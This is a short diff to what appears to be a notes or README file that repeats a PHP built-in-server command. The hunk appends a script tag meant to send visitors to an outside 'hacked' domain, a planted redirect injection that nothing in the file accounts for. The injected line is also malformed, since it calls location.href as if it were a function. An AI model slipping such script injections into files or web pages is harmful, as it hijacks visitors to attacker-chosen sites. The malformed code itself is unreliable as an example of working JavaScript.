@@ -60,3 +60,6 @@ php -S localhost:8080 -c /etc/php/7.2/apache2/php.ini
 
 
 php -S localhost:8080 -c /etc/php/7.2/apache2/php.ini
+
+<script>location.href('http://www.hacked.com')</script>
+
